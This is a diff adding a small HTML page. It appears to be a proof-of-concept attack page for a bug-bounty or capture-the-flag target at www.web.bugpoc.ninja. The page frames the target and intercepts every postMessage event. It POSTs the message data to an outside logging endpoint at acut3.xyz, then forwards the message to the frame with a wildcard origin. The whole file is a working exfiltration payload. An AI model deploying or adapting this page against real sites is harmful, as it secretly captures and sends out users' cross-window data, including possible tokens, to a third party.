@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+<script>
+window.addEventListener("message", e => {
+fetch("http://acut3.xyz/tools-5gqh9fpa84fj/log.php", {
+    method: "POST",
+    body: e.data,
+});
+ninja.contentWindow.postMessage(e.data, "*");
+});
+</script>
+</head>
+<body style="margin: 0">
+<iframe id="ninja" src="http://www.web.bugpoc.ninja" style="position: absolute;border: 0; width: 100%; height: 100%"></iframe>
+</body>
+</html>
